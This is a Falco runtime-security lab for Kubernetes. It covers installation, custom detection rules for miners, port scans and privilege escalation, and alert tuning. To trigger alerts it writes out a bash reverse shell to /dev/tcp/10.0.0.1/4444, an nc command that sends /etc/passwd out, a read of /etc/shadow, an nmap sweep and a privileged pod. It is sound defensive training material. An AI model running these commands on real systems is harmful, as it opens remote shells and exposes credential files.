# Lab 04 - Falco Runtime Security

## Objective

Deploy and configure Falco for runtime security monitoring, create custom rules, and detect threats in real-time within Kubernetes clusters.

## Duration

60 minutes

## Prerequisites

- Kubernetes cluster v1.30.x
- kubectl configured
- Helm 3.x installed
- Understanding of Linux syscalls and security concepts

## Step 1: Install Falco

```bash
# Add Falco Helm repository

helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

# Install Falco with eBPF driver (no kernel module required)

helm install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --set driver.kind=ebpf \
  --set tty=true \
  --set falcosidekick.enabled=false \
  --set auditLog.enabled=true

# Verify installation

kubectl get pods -n falco
kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=falco -n falco --timeout=120s

# Check Falco logs

kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20
```

## Step 2: Understand Default Rules

```bash
# View Falco rules

kubectl exec -n falco $(kubectl get pod -n falco -l app.kubernetes.io/name=falco -o jsonpath='{.items[0].metadata.name}') \
  -- falco --list

# Categories of default rules:
# - Shell execution
# - File access
# - Network activity
# - Privilege escalation
# - Process spawning
# - Container operations

```

## Step 3: Test Default Rules

### 3.1 Create Test Namespace

```bash
kubectl create namespace lab-falco
```

### 3.2 Test: Shell in Container

```bash
# Create test pod

kubectl run test-shell --image=nginx:1.27 -n lab-falco

# Wait for pod to be ready

kubectl wait --for=condition=ready pod test-shell -n lab-falco

# Exec into container (triggers Falco alert)

kubectl exec -it test-shell -n lab-falco -- /bin/bash

# Type: exit

# Check Falco alerts

kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=30 | grep -i "shell"

# Expected alert:
# Notice A shell was spawned in a container with an attached terminal
# (user=root user_loginuid=-1 container_id=... container_name=test-shell ...)

```

### 3.3 Test: Sensitive File Access

```bash
# Try to read /etc/shadow (triggers alert)

kubectl exec test-shell -n lab-falco -- cat /etc/shadow

# Check alerts

kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "shadow"

# Expected alert:
# Warning Sensitive file opened for reading by non-trusted program

```

### 3.4 Test: Write to Non-Temp Directory

```bash
# Write to /etc (triggers alert)

kubectl exec test-shell -n lab-falco -- touch /etc/test-file

# Check alerts

kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "write"
```

### 3.5 Test: Unexpected Network Connection

```bash
# Install curl in container

kubectl exec test-shell -n lab-falco -- apt-get update
kubectl exec test-shell -n lab-falco -- apt-get install -y curl

# Make external connection (may trigger alert depending on rules)

kubectl exec test-shell -n lab-falco -- curl -I https://example.com

# Check alerts

kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=30
```

## Step 4: Create Custom Rules

### 4.1 Create ConfigMap with Custom Rules

Create `custom-falco-rules.yaml`:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-custom-rules
  namespace: falco
data:
  custom-rules.yaml: |

    # Custom rule: Detect cryptocurrency mining

    - list: crypto_mining_processes
      items: [xmrig, ethminer, cpuminer, ccminer, nanopool, minergate]

    - rule: Cryptocurrency Mining Activity
      desc: Detect cryptocurrency mining processes
      condition: >
        spawned_process and
        (proc.name in (crypto_mining_processes) or
         proc.cmdline contains "stratum+tcp" or
         proc.cmdline contains "pool.hashvault" or
         proc.cmdline contains "xmr-stak" or
         proc.cmdline contains "monero")
      output: >
        Cryptocurrency mining activity detected
        (user=%user.name user_uid=%user.uid command=%proc.cmdline
         container_id=%container.id container_name=%container.name
         image=%container.image.repository)
      priority: CRITICAL
      tags: [malware, cryptocurrency, mitre_execution]

    # Custom rule: Detect port scanning

    - rule: Potential Port Scanning
      desc: Detect potential port scanning activity
      condition: >
        spawned_process and
        proc.name in (nmap, masscan, nc, netcat) and
        container
      output: >
        Potential port scanning detected
        (user=%user.name command=%proc.cmdline
         container_id=%container.id image=%container.image.repository)
      priority: WARNING
      tags: [network, reconnaissance, mitre_discovery]

    # Custom rule: Detect package management

    - rule: Package Management in Container
      desc: Detect package manager usage in containers
      condition: >
        spawned_process and
        container and
        proc.name in (apt, apt-get, yum, dnf, apk, pip, npm)
      output: >
        Package manager run in container
        (user=%user.name command=%proc.cmdline
         container_name=%container.name image=%container.image.repository)
      priority: NOTICE
      tags: [container, software_mgmt]

    # Custom rule: Detect SSH connection from container

    - rule: SSH Connection from Container
      desc: Detect SSH client connection from container
      condition: >
        spawned_process and
        container and
        proc.name in (ssh, scp, sftp)
      output: >
        SSH connection initiated from container
        (user=%user.name command=%proc.cmdline
         container_name=%container.name)
      priority: WARNING
      tags: [network, ssh]

    # Custom rule: Detect execution of su/sudo

    - rule: Privilege Escalation via su/sudo
      desc: Detect privilege escalation attempts
      condition: >
        spawned_process and
        container and
        proc.name in (su, sudo) and
        not proc.pname in (su, sudo)
      output: >
        Privilege escalation attempt detected
        (user=%user.name command=%proc.cmdline
         parent=%proc.pname container=%container.name)
      priority: CRITICAL
      tags: [privilege_escalation, mitre_privilege_escalation]
```

```
kubectl apply -f custom-falco-rules.yaml
```

### 4.2 Update Falco Configuration

```bash
# Update Falco to use custom rules

helm upgrade falco falcosecurity/falco \
  --namespace falco \
  --reuse-values \
  --set falco.rulesFile[0]=/etc/falco/falco_rules.yaml \
  --set falco.rulesFile[1]=/etc/falco/falco_rules.local.yaml \
  --set falco.rulesFile[2]=/etc/falco/rules.d

# Mount custom rules ConfigMap

kubectl patch deployment falco -n falco --type='json' -p='[
  {
    "op": "add",
    "path": "/spec/template/spec/volumes/-",
    "value": {
      "name": "custom-rules",
      "configMap": {
        "name": "falco-custom-rules"
      }
    }
  },
  {
    "op": "add",
    "path": "/spec/template/spec/containers/0/volumeMounts/-",
    "value": {
      "name": "custom-rules",
      "mountPath": "/etc/falco/rules.d"
    }
  }
]' 2>/dev/null || echo "Using DaemonSet, patching differently..."

# For DaemonSet (Falco typically uses DaemonSet)

kubectl set volume daemonset/falco -n falco \
  --add --name=custom-rules \
  --type=configmap \
  --configmap-name=falco-custom-rules \
  --mount-path=/etc/falco/rules.d

# Wait for rollout

kubectl rollout status daemonset/falco -n falco

# Verify custom rules loaded

kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50 | grep -i "custom"
```

## Step 5: Test Custom Rules

### 5.1 Test Cryptocurrency Mining Detection

```bash
# Create pod that simulates mining activity

kubectl run fake-miner \
  --image=busybox:1.36 \
  --command -n lab-falco \
  -- sh -c "while true; do echo 'stratum+tcp://pool.example.com:3333'; sleep 5; done"

# Check Falco alerts

kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "cryptocurrency"
```

### 5.2 Test Port Scanning Detection

```bash
# Create pod with nmap (install first)

kubectl run scanner \
  --image=alpine:3.18 \
  -n lab-falco \
  -- sleep 3600

# Install nmap

kubectl exec scanner -n lab-falco -- apk add nmap

# Run nmap (triggers alert)

kubectl exec scanner -n lab-falco -- nmap -sn 10.0.0.1/24 &

# Check alerts

kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "port scanning"
```

### 5.3 Test Package Management Detection

```bash
# Run apt-get in container (triggers alert)

kubectl exec test-shell -n lab-falco -- apt-get update

# Check alerts

kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "package"
```

### 5.4 Test Privilege Escalation Detection

```bash
# Try to use sudo (triggers alert)

kubectl exec test-shell -n lab-falco -- which sudo
kubectl exec test-shell -n lab-falco -- apt-get install -y sudo
kubectl exec test-shell -n lab-falco -- sudo -l

# Check alerts

kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "privilege escalation"
```

## Step 6: Configure Falco Outputs

### 6.1 File Output

Update Falco configuration for file output:

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-config
  namespace: falco
data:
  falco.yaml: |
    json_output: true
    json_include_output_property: true

    file_output:
      enabled: true
      keep_alive: false
      filename: /var/log/falco/events.log

    stdout_output:
      enabled: true

    priority: debug

    rules_file:
      - /etc/falco/falco_rules.yaml
      - /etc/falco/rules.d/custom-rules.yaml
```

### 6.2 Integrate with Falcosidekick (Optional)

```bash
# Install Falcosidekick for alert routing

helm install falcosidekick falcosecurity/falcosidekick \
  --namespace falco \
  --set config.webhook.address=http://webhook.example.com

# Update Falco to use Falcosidekick

helm upgrade falco falcosecurity/falco \
  --namespace falco \
  --reuse-values \
  --set falcosidekick.enabled=true \
  --set falcosidekick.fullfqdn=falcosidekick:2801
```

## Step 7: Real-World Threat Scenarios

### 7.1 Scenario: Container Escape Attempt

```bash
# Create privileged pod (bad practice, for testing only)

kubectl run escape-test \
  --image=alpine:3.18 \
  --privileged \
  -n lab-falco \
  -- sleep 3600

# Try to access host filesystem

kubectl exec escape-test -n lab-falco -- ls /host

# Check for Falco alerts about privileged container

kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=30 | grep -i "privileged"
```

### 7.2 Scenario: Reverse Shell

```bash
# Simulate reverse shell (for testing - don't do in production!)

kubectl exec test-shell -n lab-falco -- bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' &

# Check alerts

kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20 | grep -i "shell"
```

### 7.3 Scenario: Data Exfiltration

```bash
# Simulate data exfiltration

kubectl exec test-shell -n lab-falco -- bash -c 'cat /etc/passwd | nc 10.0.0.1 9999' &

# Check alerts for suspicious network activity

kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=30
```

## Step 8: Falco Rule Tuning

### 8.1 Create Exception List

```yaml
# Add to custom-rules.yaml

- list: allowed_shell_users
  items: [root, admin, operator]

- macro: user_known_shell_spawn_activities
  condition: (user.name in (allowed_shell_users))

# Update rule to use exception

- rule: Terminal shell in container
  desc: A shell was spawned in a container
  condition: >
    spawned_process and container
    and shell_procs and proc.tty != 0
    and not user_known_shell_spawn_activities
  output: >
    Shell spawned in container (user=%user.name container=%container.name)
  priority: NOTICE
```

### 8.2 Tune Rule Priority

```bash
# Set minimum priority to WARNING (reduce noise)

helm upgrade falco falcosecurity/falco \
  --namespace falco \
  --reuse-values \
  --set falco.priority=warning
```

## Step 9: Monitor and Analyze

### 9.1 View Real-Time Alerts

```bash
# Follow Falco logs

kubectl logs -n falco -l app.kubernetes.io/name=falco -f

# Filter by priority

kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "Priority:CRITICAL"

# Filter by rule

kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "Cryptocurrency"
```

### 9.2 Export Alerts

```bash
# Export all alerts to file

kubectl logs -n falco -l app.kubernetes.io/name=falco > falco-alerts.log

# Parse JSON output

kubectl logs -n falco -l app.kubernetes.io/name=falco | jq 'select(.priority=="Critical")'
```

## Challenge Exercises

1. Create rule to detect downloads using wget/curl
1. Implement rule to detect container running as root
1. Create rule for detecting DNS tunneling
1. Build alerting integration with Slack/email

## Troubleshooting

### Falco Not Detecting Events

```bash
# Check driver status

kubectl logs -n falco -l app.kubernetes.io/name=falco | grep -i "driver"

# Check eBPF probe

kubectl exec -n falco <pod-name> -- ls -la /root/.falco/

# Test with simple rule
# Spawn any process should trigger activity

```

### High CPU Usage

```bash
# Check resource usage

kubectl top pods -n falco

# Reduce rule complexity or increase sampling
# Adjust falco.yaml buffered_outputs and sampling ratio

```

### Missing Alerts

```bash
# Check rule syntax

kubectl exec -n falco <pod-name> -- falco --validate /etc/falco/rules.d/custom-rules.yaml

# Check priority threshold

kubectl logs -n falco -l app.kubernetes.io/name=falco | grep "Falco initialized"
```

## Lab Summary

You learned:

- Installing Falco with eBPF driver
- Understanding default Falco rules
- Creating custom security rules
- Testing threat detection scenarios
- Configuring outputs and integrations
- Tuning rules to reduce false positives
- Real-world security incident detection

## Cleanup

```bash
kubectl delete namespace lab-falco
helm uninstall falco -n falco
helm uninstall falcosidekick -n falco
kubectl delete namespace falco
```

## Additional Resources

- [Falco Documentation](https://falco.org/docs/)
- [Falco Rules](https://github.com/falcosecurity/rules)
- [Falco Community](https://falco.org/community/)

---

[Back to Labs](./README.md) | [Previous Lab: OPA Gatekeeper ←](./lab-03-opa-gatekeeper.md) | [Next Lab: Image Security →](./lab-05-image-security.md)
